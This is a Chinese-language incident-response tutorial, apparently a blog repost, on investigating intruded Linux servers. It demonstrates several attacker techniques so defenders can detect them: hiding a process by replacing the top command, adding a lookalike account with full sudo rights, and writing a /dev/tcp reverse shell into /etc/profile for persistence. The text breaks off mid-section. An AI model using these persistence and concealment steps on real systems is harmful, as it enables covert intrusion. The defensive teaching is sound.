---
title: 应急响应-Linux环境入侵排查篇
url: https://mp.weixin.qq.com/s/4MtWrteEVF6uOd-qJZIcqQ
source: Doonsec's feed
date: 2026-10-05
fetch_date: 2026-10-06T08:20:53.645785
---

# 应急响应-Linux环境入侵排查篇

# 应急响应-Linux环境入侵排查篇

FreeBuf\_518740
FreeBuf\_518740

陌笙不太懂安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

免责声明

```
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号陌笙不太懂安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```

```
原文作者:FreeBuf_518740原创链接:https://www.freebuf.com/articles/defense/481696.html
```

前言

在日常安全运营中，Linux 服务器被入侵是非常常见的应急场景。攻击者通过弱口令、Web 漏洞、组件漏洞、密钥泄露等方式进入主机，随后进行提权、植入后门、横向移动、挖矿、代理转发或数据窃取。

一、Linux入侵排查思路

**1.系统信息收集**

主要是收集系统的版本内核信息、系统进程信息、系统网络连接信息。比如查看

/etc/os-release         主要查看发行版

/proc/version      主要查看内核编译信息

uname -a         主要查看系统内核和系统架构

这些文件或命令可以看到一些内核比如6.8.0-106-generic

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQicbrGSFicUFjUcfvmkA1FQICnicBh8lrUH4wXh2fia3aibe4NjTWJxibABHb5hVbaPh6MgicMwRF5ecHmMjf4Z5pFJjVib9M7smdp45Q/640?wx_fmt=png&from=appmsg)

系统进程信息可以使用如下命令进行排查系统进程

top           查看实时的系统进程状态CPU占用、内存异常等等

ps -ef      查看当前系统中的进程快照

lsof          查看系统中被进程打开的文件、网络连接、库文件等信息

这里先使用top命令查看系统状态和CPU占用，如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRjzJOh7qVuMscNu3loGg69poR0j3uYekIibYVDMJibPJfPSTicEl71Ey2CVsQDoVuE26XribRKghE6GEqEw0tIdfrUJD45MkAynf8/640?wx_fmt=png&from=appmsg)

正常被挖矿的情况下CPU占用在列表中都是99%，比如我的这个sh占用了99.7%在当前的占用是最高的，但是在某种情况下cpu显示占用99%但是top列表却看不见任何占用高的进程，这种就很有可能做了进程隐藏，这里可以拿sh进程来当作挖矿进程模拟一个在top命令中不显示这个进程的一个方法，大概的攻击者思路，比如mkdir一个全是空格的目录比如“             ”，在Linux中命令几乎都是二进制文件的形式存在无法直接更改，那么就可以创建一种隐蔽性高的目录之后将命令移动到新创建的目录中之后再去改写这个top文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQ8QUjBpdLGWTCxib5rM6xtXNoOKdGWEez6c2MXum6jQgvJibkQbORgRQiaxTpuAV4eIUteDcxEIkW9M13BMX0Uia0PqnkYWicHjPe4/640?wx_fmt=png&from=appmsg)

移动过来之后就不能正常使用了，从新创建这个top二进制文件就会被视为新文件，可以这样写

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSzibic3w0qgOCV2fV7jibMblsQjONHPfqoHzsupwbNKaVJ73bQuL3kLX2BhoR7teLT5Zed1ibvHSzibX1c4oKxauZrEpg2vPjU7u10/640?wx_fmt=png&from=appmsg)

当调用top命令的时候执行/root/"       "/top下的top命令grep命令的-v参数作用是反向匹配比如不显示包含sh的行或字符串，保存退出加上x权限，之后再次查看这个sh进程发现不存在列表当中了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQJwvaWAVd7cdYaTTskicIWSneauAVXRYzHWicvVECxgOias8ibkrzuYCgmy9j3FhnbZibbAD6fBzxtQwJ2H8s7uMxrYsqEGSPjjmOs/640?wx_fmt=png&from=appmsg)

那么这种隐藏方式也很好找比如可以file查看文件类型和攻击时间范围内创建的文件，那么如何防止命令替换其实可以直接使用busybox，这个busybox是一个命令盒子可以在这里面获取相应的命令

使用busybox top命令在继续查看会发现这个sh命令是存在的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRJtZEDamjPRHJsA1yobRvicbZTJZSZXLOOUorKmyxzJMvhbP2mvfEWXg6AY4IgiciabswKRgDAHPJaWS7aibtBfCxLCbQQ7l29kXM/640?wx_fmt=png&from=appmsg)

所以在排查的时候可以带上这个busybox去排查会省很多事情，但是如果这个自带的busybox本身也被替换掉了呢是吧所以还是需要自带一份。

然后这个ps命令也是可以直接看到进程的详细信息的，这个ps的用法个人喜欢配合grep使用，比如在确定恶意进程的名字后直接ps -ef | grep sh直接找到对应的进程信息

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRLK1eWZ1EiaC9O9FbIN3tic2n3foWlBt7od0eAtOffVImtXENRWTowV21oR4qibrzuV1bcXOAAWYlkSxXBMvLQ96jScQ9icHAkicbc/640?wx_fmt=png&from=appmsg)

然后可以配合lsof -p pid命令查看进程打开的文件

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSTRgEcviblevkiakYx5OIKNTOvdDp3YVJHOLwlVjJyLmR4icJB7OrUuVdia0g5MeuZFQMPzOlibYphXbVAeiceHich9fFu3zJqMiaCpR0/640?wx_fmt=png&from=appmsg)

然后网络连接信息主要是netstat -pantu命令即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQT8heuDaZ6XblEYF8n0U85B9g8jrKRnmwrzpYsNqMFcOfYo1pyHkQp8JaRWarFiaxOskTsiau5IvoTmR1aEbXibYSOKowCzUdb44/640?wx_fmt=png&from=appmsg)

比如说有一个恶意的进程要处置掉直接kill -9 pid即可

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQiayUQy1QKzZb72fOz6xA7qGpnN2LzEfMZib0QvUn3K2yNlibOvelyTdSic6o1LU8EAtI4lqxrtvM3062aZ6CyK3IAvZjtpXY9eg0/640?wx_fmt=png&from=appmsg)

**2.恶意用户排查**

这个主要排查/etc/passwd文件，这个文件存放用户信息

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTibdLIInX8Zsq0GjuzfdRkCrogdVwnzA7zS2CkVGKHsQobpoHJjRyEJD1CREFAYwaKKqNsLW8hI3aiaicPlQIzZQDnxOO55OZOS8/640?wx_fmt=png&from=appmsg)

这里讲解一下root:x:0:0:root:/root:/bin/bash这些是什么意思

root 当前系统存在的账户

x 表示密码的意思在centos6之后所有密码存放在/etc/shadow文件中所以所有的用户都显示x

0 表示用户uid

0 表示用户所属组gid

root 表示用户描述信息

/root 表示家目录

/bin/bash 表示用户登陆后使用的命令解释器

这个解释器还可以写成/bin/sh这两个并不是同一个意思，/bin/sh不支持bash的语法比如文件存在一个bash的for循环使用sh是不能执行的，sh有一套自己的写法，同时还有/nologin、/false，这个nologin不允许登陆但是登陆会有提示，false登陆不上也不会有什么提示。

讲一下这个uid和gid，不是说名为root就是超级管理员，它是系统内核在分配账户权限的时候根据用户uid进行分配在Linux中uid=0就意味着超级管理员，在正常情况下这个root是只有一个的但是如果存在其他uid为0的用户那么它很可能就是提权后的恶意用户，然后这个gid是属于文件权限，比如存在一个admin的账户gid=0那么它可以访问一部分属于root组的文件，前提是目标文件开启了组权限。比如-rw-r----- 1 root root 0 May 17 02:00 test.txt这个文件属主root有读写权限、属组root有读权限、其他用户没有权限，这种情况下，如果admin的GID是0，也属于root组，那么理论上它可以读取这个文件，但是我们要知道其他用户访问/root都是权限不够的，所以只有当目录权限和文件权限都允许root组访问时，gid=0的admin用户才可以读取文件。

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQw3J469SFiakicfzySd5O50HgHDFZ8Zibsv5ZQllo6gwDeicXBmvR83L2odGa8Z8SrtfYovbUeAGKmURDmpdEF0spzeeDflXuG3Sw/640?wx_fmt=png&from=appmsg)

那么在Windows中也是一样的只不过Windows是sid比如

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRaMrfkzSe1CHEKCUpVQw0m2pZQ5N3mu6QtbNo0VpVZUaXOQvSBEM7M3Xxvnd4xS4OFbn2ItQk26DXlwrDNMiaE5RZZtYib11xQ0/640?wx_fmt=png&from=appmsg)

S                 表示这是一个 SID
1                 SID 版本号
5                 标识符授权机构表示NTAuthority
21                表示本地计算机或域账户
1614241991-2701058264-4051076828   机器或域的唯一标识
500               RID也就是相对标识符

这个RID=500要特别注意，通常代表内置管理员账户也就是内置的Administrator账户。

但是这里很容易被发现因为uid为0一眼就看出来了，哪是不是可以创建一个迷惑性的账户呢，比如创建一个/etc/passwd里面现有的账户去迷惑运维人员，可以找那种/bin/bash的已存在的账号的基础上加几个字符去迷惑运维。

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRTky6r84ZgF0SctdqSQqibibLLF3HRkKW5XyTeqSKuS8PIqW19jEZicXsqibJqvF0gPOIs9nmQMEdehtMuHKkqe6IDo7yIRJIJxHw/640?wx_fmt=png&from=appmsg)

这里创建了一个账户system-eventlog只有/bin/bash很可以其他都还好对于老手来说还是会看出来的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSavz7phJSZZNKa40xlvvYhCEtOicf3cF2gINgHFbzbA0GPP2Tm4VYwcZia7kFjVYsP7DRKT8N0ibv77Z1evcb9HNbjtL12tTwpb4/640?wx_fmt=png&from=appmsg)

但是这个system-eventlog账户的权限不是0但是我们都使用过sudo可以将它写入到/etc/sudoers，但是这个sudoers只有440的权限连root都更改不了，之后我们可以将它改为777然后再去增加

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQeHcOTn0rUdlicrSNkeCrkHN4ogP5ibSPgwrsBVMYakK2OCY6nV07Fic5Cup0icQnKIIdN4FSg7WS8vwxeAXk5Sb0s5SzdYyZkd3Y/640?wx_fmt=png&from=appmsg)

如下图添加权限之后将指定的用户添加到sudoers4个ALL

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSPnPFB4DqN82QI3KBFialqUCC82Or9Gkqykicia9zB4GDNPuJ5QSusY3NibtI0Ff6QEanXUlMqvPO3b5jdaIA0615oftqrqMYt5CY/640?wx_fmt=png&from=appmsg)

我们修改完后需要将权限改回440不然不生效这里来说说这4个ALL分别表示什么意思

第一个ALL表示在那些主机上运行执行sudo，ALL表示所有

第二个ALL表示允许切换的用户，ALL表示所有

第三个ALL表示允许切换成那些用户组，ALL表示所有

第四个ALL表示允许执行那些命令，ALL表示所有

可以来测试一下，切换到system-eventlog用户，使用sudo命令执行root用户权限

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQAHYZs7icwAmmYN8DCbournpDh9XcmavQibz0tsR2jqQLvpa9ia99SUrmC99WLxicInVLCRrnRUJFOOnyODbukTcLkOCtnb45iaKQA/640?wx_fmt=png&from=appmsg)

所以在正常的排查中只需要关注4个ALL或者可以执行sudo权限的用户

**3、持久化排查**

对于持久化的排查先看各种环境变量，比如/etc/profile、/etc/bash.bashrc、/root/.profile、/.bashrc

其中/etc/profile、/etc/bash.bashrc这两个文件在用户登陆的时候会加载的，那么在这个/etc/profile下设置一个持久化，比如在终端先做一个监听nc -lvn 4444，然后将反弹shell语句写入到/etc/profile比如bash -i >& /dev/tcp/10.211.55.2/4444 0>&1

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboS3LB80ZOZ9Tjqn7fD3m6KWaJS7aLiayZbU1HnzIiab806BpW0cy8k9EKhhpFWblGkFRO8IsbBRNZ4psiaX50icdp5EAEibQ9YgheZc/640?wx_fmt=png&from=appmsg)

之后重启在登陆shell就会反弹在指定的机子上

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSiaNicVEt2gmAlcHBdiaibDTOK0a3CaIoawpCqktPDPibJGPvkwZicicddodoZMKnZbT4gIMdibcL3Cp868O71wz84MHy82tzSgGX3QA4/640?wx_fmt=png&from=appmsg)

在这个文件下写入持久化所有用户在登陆的时候都会加载，这就是持久化，当我们需要进行排查的时候直接排查对应的环境变量文件就行。如果只在/root/.profile里面做持久化那么只有这个root登陆的时候才会加载，在写入持久化 的时候最后台运行比如加上&符号，比如bash -i >& /dev/tcp/10.211.55.2/4444 0>&1 &这样写就不会卡住进程也可以加nohop，接下来是服务（service）持久化，那么什么是服务呢我们可以打开一个服务看看里面是什么内容比如cat /usr/lib/systemd/system/docker.service

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRxptpkFrYuS3FmtJshv1ky8LQecauwYhD87PYOibvOlRRveEMa5mLZvw5eSljElA4MZtiatwmLEj6F2Bpdt7aMOJkicctS6ia5bicc/640?wx_fmt=png&from=appmsg)

三部分组成unit、service、install就是一个服务，unit部分的Description是描述信息不用管Documentation也不需要管只要看这个After的启动顺序，看看是在启动什么服务后在启动这个docker。

这个service部分当启动一个服务的时候比如start执行的是ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock

当停止服务的时候ExecReload=/bin/kill -s HUP $MAINPID

当restart的时候先ExecReload=/bin/kill -s HUP $MAINPID再ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock这个就是整个服务的执行过程

然后就是install部分的主要看这个WantedBy=multi-user.target即可表示多用户运行dock...